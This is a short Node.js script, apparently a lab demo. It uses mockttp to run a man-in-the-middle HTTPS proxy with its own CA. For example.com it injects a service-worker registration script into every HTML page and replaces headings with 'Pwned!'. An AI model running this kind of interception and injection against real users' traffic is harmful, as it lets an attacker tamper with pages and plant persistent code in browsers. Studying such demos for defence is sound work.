(async () => {
    const mockttp = require('mockttp');
    const path = require('path');

    // Create a proxy server with a self-signed HTTPS CA certificate:
    const https = await mockttp.generateCACertificate();
    const server = mockttp.getLocal({ https });

    const HOST = 'example.com'
    
    const serviceWorkerInclude = `
        <script>
            if ('serviceWorker' in navigator) {
                window.addEventListener('load', function () {
                    navigator.serviceWorker.register('/sw.js').then(function (response) {
                        console.info('SW registered OK.');
                    }).catch(function (error) {
                        console.error('SW failed to register', error);
                    });
                });
            }
        </script>
    `;

    await server.get(HOST + "/sw.js").thenFromFile(200, "./sw.js");


    // Or wrap targets, transforming real requests & responses:
    const serverUpdate = await server.anyRequest().forHost(HOST).thenPassThrough({

        beforeResponse: (response) => {
            // Here you can access the real response:
            // console.log(`Got ${response.statusCode} response with body: ${response.body.text}`);

            // Values returned here replace parts of the response:
            if (response.headers['content-type']?.startsWith('text/html')) {
                // E.g. append to all HTML response bodies:
                return {
                    headers: { 'content-type': 'text/html' },
                    body: response.body.text
                    .replace('</head>', serviceWorkerInclude + '</head>')
                    .replace(/<h1.*?<\/h1>/g, '<h1>Pwned!</h1>')
                };
            } else {
                return {};
            }
        }
    });

    await server.anyRequest().thenPassThrough();
    
    await server.start();

    const caFingerprint = mockttp.generateSPKIFingerprint(https.cert);

    // run npm run chrome, to start the server AND launch chrome
    if (process.argv[2] === 'chrome') {
        const launchChrome = require('./launch-chrome');
        launchChrome('https://' + HOST, server, caFingerprint);
    } else {
        // Print out the server details for manual configuration:
        console.log(`Server running on port ${server.port}`);
        console.log(`CA cert fingerprint ${caFingerprint}`);
    }
})(); // (All run in an async wrapper, so we can easily use top-level await)